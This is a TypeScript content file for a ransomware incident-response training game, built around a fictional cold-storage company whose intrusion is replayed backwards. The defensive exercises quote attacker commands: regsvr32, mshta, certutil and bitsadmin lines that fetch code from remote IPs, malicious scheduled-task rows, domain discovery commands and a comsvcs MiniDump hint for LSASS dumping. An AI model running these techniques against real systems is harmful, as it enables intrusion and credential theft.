import type { RoomExperience } from "./types";

// "Operation Cold Vault" for the "ransomware-full-lifecycle" room.
// Script: docs/campaign/81-ransomware-full-lifecycle.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Marchbank Cold Storage (fictional), not the graded tasks' NexaCorp records.
// Mentor: Elodie Kamau, Incident Commander.
// Signature, Where Could You Have Stopped It?: one intrusion replayed backwards from the ransom
// note to the first foothold. The first lab walks the note back to the first sign-in, and that
// lands the learner at The Foothold. The stations then go through the stages, and at each one the
// learner finds the last point a defender could still have broken the chain. `sequence` carries
// the timeline, `outbreak` is the encryption run, and a final `defuse` replays every cut from
// Sunday night back to Day -26, each one earlier and cheaper than the last.
// Game mix: deduce + defuse + outbreak.
//
// TASK ORDER CHANGED. In the room, m1 sits right after q2, but three of its nine pairs (shadow
// copies, log clearing, cloud exfiltration) are taught only in r6 and r7. New order, for the
// integrator. It keeps the readings in their 1 to 8 order, and o1 stays right after r6 and la2
// right after r7, because their readings say "that follows":
//   r1, r2, q1 | r3, r4, la1 | r5, q2, r6, o1 | r7, la2, ac1, m1 | r8, la3, q3, f1
//
// Marchbank timeline, kept the same across every lab (Day 0 is Monday 2026-11-09):
//   Day -28 lure delivered to d.moyo, never opened. Day -27 exploit probes refused on MB-MFT-01.
//   Day -26 ext-polarline signs in over RDP to MB-RDP-02 after 1,912 failures. A broker sells it.
//   Day -19 the affiliate arrives: loader, then \Marchbank\ChillerTelemetry on MB-RDP-02.
//   Day -17 LDAP burst against MB-DC-01. Day -14 lsass.exe read on MB-MAINT-07, f.nkosi taken.
//   Day -12 DCSync from MB-MAINT-07. Day -9 service CHLRSVC on 11 servers.
//   Day -5 Defender real-time protection off and D:\Stage excluded on MB-FS-01. The EDR sensor
//   there stays up and keeps recording, which is why later evidence on that host exists.
//   Day -4 34 .7z volumes on MB-FS-01. Day -3 140 GB out with MEGAcmd, to a cloud storage account.
//   Day -1 23:41 shadow copies gone, 23:44 log cleared, 23:52 \Marchbank\DefrostCycle on 48 hosts.
//   Day 0 05:20 the task fires, the encryptor spreads on over admin shares to 212 of 310 hosts.
//   05:52 HOARFROST-README.txt on the dispatch screens.
//
// Lab data differs from the graded tasks: the first door is exposed RDP sold by a broker, the
// edge-device case is a file-transfer gateway at another company, never a VPN appliance with an
// overnight login, and the primer's worked example ends in phishing (q1). The stolen account is a building-systems engineer behind a Legacy-ServerOps
// nesting, never a helpdesk technician (la1). The LSASS record is a Sysmon Event 10 from a helper
// in a vendor-looking folder with 0x1410, run as SYSTEM, never rundll32 with comsvcs on
// WKS-IT-0417 and never 0x1FFFFF, and comsvcs appears only as one recall fact with no event (la1). The lateral case uses a
// renamed service CHLRSVC on 11 hosts, never PSEXESVC on two servers (q2). Exfiltration is MEGAcmd
// from MB-FS-01, never rclone from a Finance share (la2); rclone's flags are defined in a primer with
// no example, and the worked example is an azcopy job. The benign case is AzCopy and WinSCP, never rclone to SharePoint (ac1). The
// encryptor is spoolsrv.exe against spoolsv.exe, never wuauclt32.exe, and its rename example is
// pallet_plan.xlsx.hfr9c04 (la3, f1). The tag worksheet shows the technique IDs as row data and
// never asks them (m1). No lab lists the nine stages of o1: the two sequences hold seven and six
// concrete events, with no stage names, and they run backwards.

export const RANSOMWARE_FULL_LIFECYCLE: RoomExperience = {
  roomId: "ransomware-full-lifecycle",
  codename: "Operation Cold Vault",
  theme: "coldvault",
  handler: { name: "Elodie Kamau", role: "Incident Commander, Marchbank Cold Storage" },
  briefing: [
    "Marchbank Cold Storage. Nine refrigerated warehouses, 640 staff, and one dispatch system that tells every forklift what to pull.",
    "Monday, 05:52. The dispatch screens show a ransom note, the forklifts stop, and Elodie Kamau takes command of the incident.",
    "Everyone wants to start at the note. Elodie starts there only to walk backwards, because the note is the last page of a story that began weeks ago.",
    "Walk it back to the first foothold, then take it stage by stage and see what each one left behind.",
  ],
  mission: "Walk the note back to the first sign-in, name the door, find the account that reached everything, tell an intruder from an admin, catch what breaks recovery, stop the data at the dock, run the encryption yourself, then answer the calls that land on the SOC that morning.",
  estimate: "~75 min",
  look: { primary: "#b3ecff", secondary: "#f6c177", warn: "#ff4d6d" },
  scene: "facilitycoldvault",
  layout: "facility",
  stations: [
    {
      id: "foothold",
      label: "The Foothold",
      topic: "Ransomware as an industry · double extortion · phishing, edge devices and exposed RDP",
      tagline: "Twenty-six days before the note",
      building: "reception",
      taskIds: ["rw-r1", "rw-r2", "rw-q1"],
    },
    {
      id: "masterkey",
      label: "The Master Key",
      topic: "LOLBins · scheduled tasks · Active Directory discovery · LSASS and DCSync",
      tagline: "One account that opens everything",
      building: "vault",
      taskIds: ["rw-r3", "rw-r4", "rw-la1"],
    },
    {
      id: "coldaisle",
      label: "The Cold Aisle",
      topic: "PsExec, WMI and RDP · recovery, tooling and logs under attack · the whole chain in order",
      tagline: "Moving quietly, rack by rack",
      building: "wing",
      taskIds: ["rw-r5", "rw-q2", "rw-r6", "rw-o1"],
    },
    {
      id: "loadingdock",
      label: "The Loading Dock",
      topic: "Exfiltration first · staging · cutting a live transfer · telling a real job from a theft · ATT&CK tags",
      tagline: "The data leaves before the note",
      building: "factory",
      taskIds: ["rw-r7", "rw-la2", "rw-ac1", "rw-m1"],
    },
    {
      id: "note",
      label: "The Note",
      topic: "How the encryption works · the moment of impact · reading a fleet of hosts · who decides what",
      tagline: "The only part anyone noticed",
      building: "emergency",
      taskIds: ["rw-r8", "rw-la3", "rw-q3", "rw-f1"],
      boss: true,
    },
  ],
  personas: {
    "rw-q1": { name: "Elodie Kamau", role: "Incident Commander", line: "What goes at the top of your timeline?" },
    "rw-la1": { name: "Elodie Kamau", role: "Incident Commander", line: "Read all of it, then tell me what it changes." },
    "rw-q2": { name: "Elodie Kamau", role: "Incident Commander", line: "Two servers, nine minutes apart. What am I looking at?" },
    "rw-o1": { name: "Elodie Kamau", role: "Incident Commander", line: "The board wants the whole story, first page to last." },
    "rw-la2": { name: "Elodie Kamau", role: "Incident Commander", line: "Another host, another hour. Where does it fit?" },
    "rw-ac1": { name: "Elodie Kamau", role: "Incident Commander", line: "An older detection, from before all this. Your verdict?" },
    "rw-m1": { name: "Elodie Kamau", role: "Incident Commander", line: "The report needs a tag on every line." },
    "rw-la3": { name: "Elodie Kamau", role: "Incident Commander", line: "Fast, but not blind. Take me through this one host." },
    "rw-q3": { name: "Elodie Kamau", role: "Incident Commander", line: "The bridge call starts in two minutes. What do we do?" },
    "rw-f1": { name: "Elodie Kamau", role: "Incident Commander", line: "HR is on the phone about a file. I need its name." },
  },
  briefings: {
    // ── Reading 1: the industry, and the replay ──
    "rw-r1": [
      {
        kind: "sequence",
        title: "Walk It Back From the Note",
        prompt: "Monday 05:52, Marchbank. Everyone is staring at the note, and Elodie wants one thing first: how far back does this go? Seven pieces of evidence are on the table, none of them dated. Start at the note and walk backwards to the first thing that happened.",
        howTo: [
          "Read all seven first. None of them has a date.",
          "Tap the ransom note. Then tap what that event needed, then what that needed, back to the first sign-in.",
          "A wrong tap shakes. It means another event still sits between that one and the last one you placed.",
        ],
        items: [
          { id: "dcsync", text: "Every password hash in the domain pulled from the domain controller", note: "Day -12. Spreading needs an account that works everywhere, so the crew took them all." },
          { id: "note", text: "HOARFROST-README.txt on the dispatch screens", note: "Day 0, 05:52. The only event nobody could miss, and the only one nobody could stop." },
          { id: "out", text: "140 GB pushed from a file server to a cloud storage account", note: "Day -3. The crew banked the stolen copy before doing anything loud." },
          { id: "first", text: "A first sign-in by a contractor's account, from an address nobody knew", note: "Day -26. Twenty-six days before the note, and it looked like a normal login." },
          { id: "enc", text: "A new file extension spreading across 212 hosts", note: "Day 0, 05:20. A note means nothing until the files are locked." },
          { id: "map", text: "A burst of directory queries mapping every group and admin", note: "Day -17. You can't steal the right account until you know which one it is." },
          { id: "off", text: "Antivirus real-time protection switched off on the file server", note: "Day -5. The crew needed admin rights to do this, and did it before moving anything big." },
        ],
        order: ["note", "enc", "out", "off", "dcsync", "map", "first"],
        miss: "Not yet. What did the last event you placed need?",
        doneNote: "Twenty-six days, first row to last, and each step left evidence somewhere. The note is the end of the story. From here you go through it stage by stage, starting at that first sign-in, and at each stage you look for the last point a defender could still have broken the chain.",
        primer: {
          title: "How to walk a story backwards",
          points: [
            "Start from what nobody can miss, and ask one thing of each event: **what did this need before it could happen?**",
            "An encryptor on hundreds of hosts needs an account that works everywhere. That needs stolen credentials, and stealing them needs someone already inside.",
            "Modern crews copy the data out **before** they encrypt, and they switch off whatever would block the transfer before that.",
            "**Dwell time** is the gap between first access and impact. It can run to days or weeks.",
          ],
          example: {
            label: "Worked example: a fraudulent payment",
            lines: [
              "Friday: the bank confirms a payment to a new account.",
              "That needed an approved invoice, so find who approved it.",
              "That needed the finance mailbox to hide the supplier's replies: an inbox rule.",
              "That rule needed a stolen sign-in, and that needed a fake login page the week before.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "sort",
        title: "What Does a Restore Undo?",
        prompt: "The board's first words are 'we have backups', and they do: clean, offline, taken on Saturday. Sort what a full restore fixes at Marchbank from what it leaves exactly where it is.",
        buckets: [
          { id: "fixed", label: "A clean restore fixes it" },
          { id: "stays", label: "A restore can't touch it" },
        ],
        items: [
          { id: "r1", text: "The dispatch database, encrypted on MB-DISPATCH-01", bucket: "fixed", why: "Saturday's copy brings it back. You lose the weekend's picks and nothing else." },
          { id: "r2", text: "Shift rotas on the file share, all renamed and unreadable", bucket: "fixed", why: "Files you can replace are exactly what backups are for." },
          { id: "r3", text: "140 GB of customer contracts in the crew's hands, with a sample on a leak site", bucket: "stays", why: "This is the second lever. A copy that has left the building can't be restored back in." },
          { id: "r4", text: "Pharma customers' temperature records, named, in the same leak", bucket: "stays", why: "Publication is a harm to people outside Marchbank, and no backup answers it." },
          { id: "r5", text: "Label printer settings, encrypted on the print server", bucket: "fixed", why: "Annoying and fully recoverable. Encryption alone only ever threatened this kind of thing." },
          { id: "r6", text: "Every domain password hash, taken on Day -12", bucket: "stays", why: "A restore brings back the same passwords the crew already holds. Only a reset changes them." },
          { id: "r7", text: "A scheduled task the crew planted on Day -19", bucket: "stays", why: "Saturday's backup was taken after Day -19, so the task comes back with the server." },
        ],
        primer: {
          title: "Why stealing came before locking",
          points: [
            "**Encryption** is one lever: pay for the key or lose the files. Good offline backups broke it.",
            "**Double extortion**, from around 2019 to 2020, adds a second lever: a copy of the data stolen first, and a threat to publish it on a **leak site**.",
            "The two levers are separate. A restore answers the first one and does nothing to the second.",
          ],
          example: {
            label: "Worked example: a shop ledger",
            lines: [
              "A thief locks a shop's ledger in a box and demands money for the combination.",
              "The shop has a second copy, so it ignores the demand.",
              "Next time the thief photocopies the ledger first, and threatens to post the pages.",
              "The second copy of the ledger doesn't help with that.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "match",
        title: "Three Businesses Behind One Note",
        prompt: "The note is signed Hoarfrost, and the board asks who Hoarfrost is. Elodie's threat-intel contact sends what is known. Match each piece of the Marchbank case to what it tells you about who did it.",
        pairs: [
          { id: "iab", left: "A market listing two days after the first sign-in: 'RDP, cold-chain logistics, 640 staff'", right: "An Initial Access Broker sold the way in", why: "A broker only breaks in and sells the foothold. That's part of why dwell time is so unpredictable: the buyer arrived a week later." },
          { id: "op", left: "The encryptor build, the chat portal and the leak site", right: "A Ransomware-as-a-Service operator built the kit", why: "The operator maintains the toolkit and rents it out." },
          { id: "aff", left: "Hands on the keyboard from Day -19: the mapping, the theft, the staging", right: "An affiliate ran the intrusion", why: "The affiliate does the actual work and splits the ransom with the operator, commonly with the larger share." },
          { id: "brand", left: "Another Hoarfrost victim: phishing, a faster tempo, a different language", right: "The name is a brand, not one group of people", why: "Same rented encryptor, different people. A family name tells you little about how this intrusion will behave." },
        ],
        primer: {
          title: "Who is behind a ransomware name",
          points: [
            "**Ransomware-as-a-Service (RaaS):** an operator builds the encryptor, negotiation portal and leak site, then rents them out.",
            "**Affiliates** carry out the intrusion and split the proceeds with the operator.",
            "**Initial Access Brokers (IABs)** do nothing but break in and sell the foothold. The person who gets in and the person who encrypts are often strangers.",
          ],
          example: {
            label: "Worked example: a franchise",
            lines: [
              "A burger brand writes the recipes and the ordering app. A franchisee runs each shop and shares the takings.",
              "Two shops with the same sign can have different staff, hours and standards.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Reading 2: the three doors ──
    "rw-r2": [
      {
        kind: "deduce",
        title: "Find the First Door",
        prompt: "Day -26. Marchbank has six ways in from the outside, and one of them let the broker through. Patch state alone won't tell you which. Strike the doors out as Elodie reads what the logs show.",
        nameColumn: "Entry point",
        columns: ["Exposed as", "Agent on it?", "Patch state", "Logs, that week", "Mail trace"],
        suspects: [
          { id: "vpn", name: "MB-VPN-01", cells: ["SSL-VPN portal", "No", "Current", "Staff sign-ins, all with MFA", "None"] },
          { id: "mft", name: "MB-MFT-01", cells: ["File-transfer gateway", "No", "Patched the week before", "Exploit probes, one 200 response", "None"] },
          { id: "rdp", name: "MB-RDP-02", cells: ["RDP on port 3389", "Yes", "Current", "1,912 failures, then one success", "None"] },
          { id: "fw", name: "MB-FW-02", cells: ["Firewall admin page", "No", "One version behind, no public flaw", "No sign-ins", "None"] },
          { id: "mail", name: "MB-MAIL-01", cells: ["Webmail", "Yes", "Current", "Staff sign-ins, all with MFA", "Two lures, both blocked"] },
          { id: "inbox", name: "d.moyo's inbox", cells: ["Email", "Yes", "Current", "Normal", "One lure delivered, never opened"] },
        ],
        clues: [
          "A patched gateway answers 200 to its own public login page, so that probe got nowhere. The session that moved first used a valid password.",
          "Nothing in the mail logs ties to that account: no lure ever reached it.",
          "That account never answered a multi-factor prompt.",
        ],
        culprit: "rdp",
        why: "MB-RDP-02. Guessing ended in one working password for ext-polarline, the refrigeration contractor's account, and Remote Desktop on the internet had no second factor: T1110, then T1021.001. Look at how the others fell. Patch state and agent coverage say which door was weakest, but the logs say which door was used. Taking RDP off the internet and requiring MFA would have broken the chain here, 26 days before the note.",
        primer: {
          title: "What each door leaves behind",
          points: [
            "**Phishing (T1566):** a lure in the mail logs, then Office or a download starting something on a device. It often targets IT and helpdesk staff, whose accounts reach further.",
            "**Edge-device exploit (T1190, often then T1133):** a public flaw in a VPN, firewall or file gateway, which patches on its vendor's own cycle. The session that follows looks like an ordinary login.",
            "**Exposed RDP (T1110, then T1021.001):** Remote Desktop Protocol reachable from the internet. Passwords are guessed or bought until one works.",
            "**EDR** (endpoint detection and response) is the agent on a device that records what runs there. Check where you have it and where you don't.",
          ],
          example: {
            label: "Worked example: a dental practice",
            lines: [
              "Mail logs show an attachment reaching the receptionist at 09:12. At 09:14 Word starts powershell.exe.",
              "Leading hypothesis: T1566. It goes at the top of the timeline now, and it changes if the evidence does.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "defuse",
        title: "Right Door, Right Fix",
        prompt: "Elodie's file of past cases: three other companies, three different doors. Closing the symptom leaves the door open for the same crew, or for whoever buys the access next. For each case, cut the one action that actually closes it.",
        device: "The entry-point board",
        seconds: 70,
        rounds: [
          {
            id: "phish",
            state: "A shipping agent. Word started wscript.exe minutes after an invoice mail reached a dispatcher. The laptop has been rebuilt.",
            wires: [
              { id: "a", label: "Pull the message everywhere and block the sender" },
              { id: "b", label: "Patch the VPN appliance this week, then close the case" },
              { id: "c", label: "Close port 3389 at the firewall and close the case" },
            ],
            cut: "a",
            hint: "Where did this one arrive?",
            why: "The door was the mail. The same message may still be sitting in other inboxes, and a rebuilt laptop does nothing about that.",
          },
          {
            id: "edge",
            state: "A food wholesaler. A file-transfer gateway with an authentication bypass published six days ago. An admin session from a hosting provider, with no failed logons. No agent on the box.",
            wires: [
              { id: "a", label: "Reset the admin's password and close the case" },
              { id: "b", label: "Patch it now and kill every session on it" },
              { id: "c", label: "Send staff a phishing reminder" },
            ],
            cut: "b",
            hint: "What does the session rely on, the password or the flaw?",
            why: "A session taken through the flaw never used the password. Patching stops the next attempt, but a session token already stolen lives on until you invalidate it.",
          },
          {
            id: "rdp",
            state: "A haulage firm. 6,000 failed sign-ins over a weekend against one server's port 3389, then a success. No second factor.",
            wires: [
              { id: "a", label: "Tune the mail gateway" },
              { id: "b", label: "Reset that one password and leave the port as it is" },
              { id: "c", label: "Take RDP off the internet and require MFA" },
            ],
            cut: "c",
            hint: "After the reset, what can the guesser still do?",
            why: "A new password just restarts the guessing. The exposure is the door, and any bought credential walks straight through it.",
          },
        ],
        lesson: "The vector decides the fix: mail, patch and session tokens, or exposure and MFA. Treat all three as 'the user should have known better' and two of the three commonest doors stay open. At this stage the chain is one account and one host wide, so this is the cheapest place in the story to break it.",
      },
    ],
    // ── Reading 3: surviving the first reboot ──
    "rw-r3": [
      {
        kind: "match",
        title: "Signed by Microsoft, Run by the Crew",
        prompt: "Day -19. The affiliate is on MB-RDP-02, and nothing it runs has a bad hash. These four lines came out of the telemetry later. Match each signed Windows tool to the job the crew gave it.",
        pairs: [
          { id: "regsvr", left: "regsvr32.exe /s /n /u /i:http://198.51.100.24/c.sct scrobj.dll", right: "Runs a script fetched from a remote server, with no program dropped", why: "Regsvr32 will load a remote scriptlet through scrobj.dll. The registration tool never registers anything here." },
          { id: "mshta", left: "mshta.exe http://198.51.100.24/u.hta", right: "Runs an HTML application straight from a URL", why: "Mshta executes script inside an .hta file, and an internet URL is rarely a reason for it to run." },
          { id: "rundll", left: "rundll32.exe C:\\Users\\Public\\cache.db,Entry", right: "Calls a function exported by a DLL, whatever the file is called", why: "Rundll32 doesn't care about the extension. A .db file with an exported function runs like any DLL." },
          { id: "certutil", left: "certutil.exe -decode upd.b64 upd.dll", right: "Turns base64 text back into a binary", why: "Certutil has a built-in decoder and download function, so it can pull in a second stage while looking like certificate work." },
        ],
        primer: {
          title: "What a LOLBin is",
          points: [
            "A **LOLBin** (living-off-the-land binary) is a signed Windows tool that an attacker reuses instead of bringing a program of their own.",
            "File-reputation checks pass it, because the file really is genuine.",
            "So judge the **arguments, the parent and the location**, not the file.",
            "The crew's order of work: run something first, then make it survive a reboot, and only then start exploring.",
          ],
          example: {
            label: "Worked example: bitsadmin",
            lines: [
              "`bitsadmin /transfer j http://203.0.113.9/a.bin C:\\Users\\Public\\a.bin`",
              "The file is signed and its hash is clean. The arguments fetch a binary from a bare IP address into a public folder.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "worksheet",
        title: "One Task, or a Fleet?",
        prompt: "After the note, Elodie runs a retro-hunt on Event ID 4698. Read the rows the way a domain-wide emergency reads: same name, same action, same run time, on how many hosts, inside how many minutes?",
        caption: "Security log · Event ID 4698 · retro-hunt, sample of rows",
        columns: ["Day", "Time", "Computer", "TaskName", "TaskContent: Exec", "TaskContent: trigger", "SubjectUserName"],
        rows: [
          ["-19", "02:14", "MB-RDP-02", "\\Marchbank\\ChillerTelemetry", "rundll32.exe C:\\Users\\Public\\cache.db,Entry", "Daily 03:00", "ext-polarline"],
          ["-16", "10:31", "MB-IT-03", "\\IT\\CleanTemp", "cleanmgr.exe /sagerun:1", "Weekly, Sun 22:00", "adm-p.ruiz"],
          ["-8", "14:05", "MB-WS-044", "\\IT\\LabelDriver", "pnputil.exe /add-driver label.inf", "Once, 18:00", "adm-p.ruiz"],
          ["-1", "23:52", "MB-FS-02", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
          ["-1", "23:52", "MB-ERP-02", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
          ["-1", "23:53", "MB-WMS-01", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
          ["-1", "23:54", "MB-PRN-01", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
          ["-1", "23:55", "MB-WS-118", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
          ["-1", "23:55", "MB-WS-096", "\\Marchbank\\DefrostCycle", "C:\\ProgramData\\Hf\\spoolsrv.exe", "Once, Mon 05:20", "f.nkosi"],
        ],
        questions: [
          { id: "name", q: "Which task name repeats across hosts?", hint: "Compare the TaskName column from the bottom up.", answer: ["DefrostCycle", "\\Marchbank\\DefrostCycle", "Marchbank\\DefrostCycle"], why: "One name, one action, one run time. A refrigeration-sounding name is camouflage: read the action, an unknown program in ProgramData." },
          { id: "mins", q: "In how many minutes did those rows land, first to last?", hint: "Subtract the first Time from the last.", answer: ["3", "3 minutes"], why: "Three minutes across very different machines. No human administrator works like that, so this is a push." },
          { id: "warn", q: "How many whole hours of warning did that give before the run time?", hint: "From 23:55 to 05:20, rounded down.", answer: ["5", "5 hours"], why: "Five hours with nothing encrypted yet. This pattern is one of the strongest precursors a SOC can catch." },
          { id: "first", q: "The Day -19 row could pass as routine automation until you read one column. Which account created it?", hint: "Would that kind of account create tasks at 02:14?", answer: ["ext-polarline"], why: "A contractor's account, at 02:14, running rundll32 on a file in Public. One row is easy to miss, and removing it on Day -19 would have ended this cleanly, before anything destructive happened." },
        ],
        primer: {
          title: "Reading Event ID 4698",
          points: [
            "**Event ID 4698** in the Security log records a new scheduled task, whether from schtasks.exe or the Task Scheduler API.",
            "Crews favour tasks because the mechanism does two jobs: a small foothold on day one, then firing the encryptor on many hosts at one set time.",
            "**Registry Run and RunOnce keys** under `...\\CurrentVersion\\Run` also persist, but they suit a single host, not a timed fleet-wide start.",
            "One new task on one host is usually IT. The same task on many hosts within minutes needs an owner, fast.",
          ],
          example: {
            label: "Worked example: a software rollout",
            lines: [
              "`\\IT\\AgentUpgrade` lands on 180 hosts in four minutes, from the management server's account, with a change ticket.",
              "That is the fleet pattern with an owner. The same shape from a person's account, with no ticket, is the one to wake people for.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Reading 4: mapping the domain, then owning it ──
    "rw-r4": [
      {
        kind: "deduce",
        title: "Whose Token Reaches the Domain?",
        prompt: "Day -17. The crew can reach MB-MAINT-07, the workstation that runs the chillers' building management system (BMS), and needs one account that reaches every host. Six accounts are in play. Ignore the titles, strike them out as Elodie walks the groups, and name the one worth stealing.",
        nameColumn: "Account",
        columns: ["Job title", "Direct group", "That group sits in", "Signed in to MB-MAINT-07?"],
        suspects: [
          { id: "ruiz", name: "adm-p.ruiz", cells: ["Senior IT administrator", "Domain Admins", "Nothing", "No, never"] },
          { id: "lind", name: "a.lindqvist", cells: ["Site manager", "Site-Managers", "All-Staff", "Yes"] },
          { id: "bms", name: "svc-bms", cells: ["Service account", "BMS-Services", "Site-Support", "Yes"] },
          { id: "nkosi", name: "f.nkosi", cells: ["BMS engineer", "BMS-Engineers", "Legacy-ServerOps, which sits in Domain Admins", "Yes"] },
          { id: "adey", name: "r.adeyemi", cells: ["Refrigeration technician", "Site-Support", "All-Staff", "Yes"] },
          { id: "tana", name: "k.tanaka", cells: ["Gatehouse supervisor", "Gatehouse", "All-Staff", "Yes"] },
        ],
        clues: [
          "Memory on this workstation only holds accounts that signed in to it.",
          "Site-Support manages the PCs of one site and nothing beyond.",
          "All-Staff is a mailing group. It grants no administrative rights at all.",
        ],
        culprit: "nkosi",
        why: "f.nkosi. The title says refrigeration controls, but BMS-Engineers sits in Legacy-ServerOps, a group someone once placed inside Domain Admins and never took out. adm-p.ruiz is the obvious target and was never on this host, so its credentials aren't there to take. Judge reach by following the groups to the end of the chain, and by what is actually cached on the host.",
        primer: {
          title: "How a crew maps a domain",
          points: [
            "`net group \"Domain Admins\" /domain` lists the most privileged accounts. `nltest /domain_trusts` shows which other domains could be reached.",
            "`whoami /groups` shows everything the current token holds, including rights inherited through **nested groups**.",
            "Collectors such as SharpHound pull all of this in one pass. A domain controller sees it as a short burst of **LDAP** (Lightweight Directory Access Protocol) queries.",
            "**LSASS** (Local Security Authority Subsystem Service) keeps credential material for accounts signed in to that host, including domain accounts. A host only gives up who has been on it.",
          ],
          example: {
            label: "Worked example: following a chain",
            lines: [
              "`s.oyelaran` is in `Print-Ops`. `Print-Ops` sits in `Facilities`. `Facilities` sits in nothing.",
              "That token reaches what those two groups reach, and the job title changes nothing in either direction.",
            ],
          },
          fold: true,
        },
      },
      {
        kind: "defuse",
        title: "What Did They Just Take?",
        prompt: "Credential theft comes in sizes, and the size decides your response. Three records show three methods, and the fourth is about the clean-up. Read each one and cut the wire that fits.",
        device: "The credential board",
        seconds: 90,
        rounds: [
          {
            id: "lsass",
            state: "Sysmon Event ID 10 on MB-MAINT-07: a process opened lsass.exe with memory-read rights. What is exposed?",
            wires: [
              { id: "a", label: "Every password hash in the domain" },
              { id: "b", label: "The credentials cached on this one host" },
              { id: "c", label: "A full copy of the directory database file" },
            ],
            cut: "b",
            hint: "LSASS only knows who signed in here.",
            why: "T1003.001, LSASS memory. It gives you what's cached on that host, every account that signed in, and you repeat it host by host.",
          },
          {
            id: "dcsync",
            state: "Event ID 4662 on MB-DC-01: f.nkosi exercised Replicating Directory Changes All. The matching logon came from 10.40.7.19, a workstation.",
            wires: [
              { id: "a", label: "Password hashes for the whole domain" },
              { id: "b", label: "The cached credentials in the domain controller's LSASS" },
              { id: "c", label: "One Kerberos ticket, replayed" },
            ],
            cut: "a",
            hint: "Who normally asks a domain controller for that?",
            why: "DCSync, T1003.006. Replication is a normal operation between domain controllers, so the request itself is well formed. What's wrong is where it came from.",
          },
          {
            id: "ntds",
            state: "A different method, from another case: an admin signed in to a domain controller, made a volume shadow copy and copied ntds.dit out of it.",
            wires: [
              { id: "a", label: "Replication: no file was touched" },
              { id: "b", label: "One workstation's cached accounts, and nothing more" },
              { id: "c", label: "The database, by file access on the DC" },
            ],
            cut: "c",
            hint: "Which method here needs to be on the DC's disk?",
            why: "A similar haul by a different route. This one leaves file activity on the domain controller, so the trace is different too.",
          },
          {
            id: "krbtgt",
            state: "Day -12 is confirmed and a domain-wide reset is planned. A colleague asks why krbtgt, the account whose key signs Kerberos tickets, is on the list twice.",
            wires: [
              { id: "a", label: "A reset takes hours to reach every domain controller" },
              { id: "b", label: "The domain also accepts the previous key" },
              { id: "c", label: "The first reset only disables the account" },
            ],
            cut: "b",
            hint: "What happens to the old key after one reset?",
            why: "The KDC checks tickets against the current key and the one before it. After one reset the stolen key is still the previous one. A second reset, once ticket lifetimes have passed, retires it, and any ticket forged with it stops working.",
          },
        ],
        primer: {
          title: "Three sizes of credential theft",
          points: [
            "**One host:** LSASS memory (T1003.001) holds what that host has cached.",
            "**One credential:** replaying a Kerberos ticket reuses what you already have.",
            "**The directory:** domain controllers keep each other in step through **replication**, and that traffic includes password hashes. Two rights allow it, Replicating Directory Changes and Replicating Directory Changes All. Using them from somewhere that isn't a domain controller is **DCSync (T1003.006)**.",
            "The same hashes also sit in **NTDS.dit**, the directory database file on each domain controller.",
            "**Event ID 4662** records access to a directory object, including use of those rights.",
          ],
          example: {
            label: "Worked example: a hotel's keys",
            lines: [
              "A stolen key ring opens one cleaner's floors.",
              "The key cabinet in the office holds every key in the building. That's a very different loss, even if nobody has used a key yet.",
            ],
          },
          fold: true,
        },
        lesson: "Ask what left, not where it happened. One LSASS gives one host's cached accounts, and replication gives the whole domain. The cheap cut was Day -14: rotate what was on that workstation, treat f.nkosi's reach as domain-wide and scope it, and Day -12 never happens. Once every hash is gone, the chain can only be broken by resetting the entire domain.",
      },
    ],
    // ── Log analysis 1: warm-up on reading a credential record ──
    "rw-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of an LSASS Read",
        prompt: "Before the graded record: the Sysmon event from Marchbank's Day -14, the morning f.nkosi's credentials went. Read it field by field. Different host, different tool and different mask from what comes next, but the same questions.",
        source: "Sysmon · Event ID 10 ProcessAccess · MB-MAINT-07",
        fields: [
          { key: "UtcTime", value: "2026-10-26 03:10:44.218", label: "When" },
          { key: "SourceImage", value: "C:\\ProgramData\\Realtek\\Audio\\rtkhelper.exe", label: "Who reached in", note: "The full path of the process that opened the handle." },
          { key: "TargetImage", value: "C:\\Windows\\System32\\lsass.exe", label: "What it touched", note: "The process whose memory was requested. LSASS holds credentials for accounts signed in to this host." },
          { key: "TargetProcessId", value: "724", label: "Target PID", note: "The target's process number, as this event records it. A command line can name a process by this number." },
          { key: "GrantedAccess", value: "0x1410", label: "What it asked for", note: "Memory read plus query rights. 0x1FFFFF is PROCESS_ALL_ACCESS. 0x1010, 0x1410 and 0x1438 also include memory read. Some consoles print decimal: 0x1410 is 5136." },
          { key: "SourceUser", value: "NT AUTHORITY\\SYSTEM", label: "Ran as", note: "The account the tool ran as. The credentials it reads belong to whoever has signed in here, and f.nkosi had a session open that morning." },
          { key: "CallTrace", value: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2b92e|C:\\Windows\\SYSTEM32\\dbgcore.dll+6dd5", label: "How", note: "The modules on the call stack. dbgcore.dll holds the memory-dump routines." },
        ],
        summary: "Read the target first, then the mask, then whose credentials were in memory. One fact to carry forward: comsvcs.dll exports a function called MiniDump, which takes a PID, an output path and the word full.",
        primer: {
          title: "How a process reads LSASS",
          points: [
            "To read another process's memory, a process opens a handle and asks for rights. Those rights are the **access mask** in the record, `GrantedAccess` in Sysmon.",
            "**Sysmon**, a free Microsoft logging tool, records this as Event ID 10.",
            "A mask is a set of permission bits, so ask whether it includes memory read.",
          ],
          example: {
            label: "Worked example: a harmless handle",
            lines: [
              "A monitoring agent opens lsass.exe with `0x1000`, query-limited information only.",
              "That mask has no memory-read bit, so it can check that the process exists and can't read a credential.",
            ],
          },
          fold: true,
        },
      },
    ],
    // ── Reading 5: lateral movement ──
    "rw-r5": [
      {
        kind: "sort",
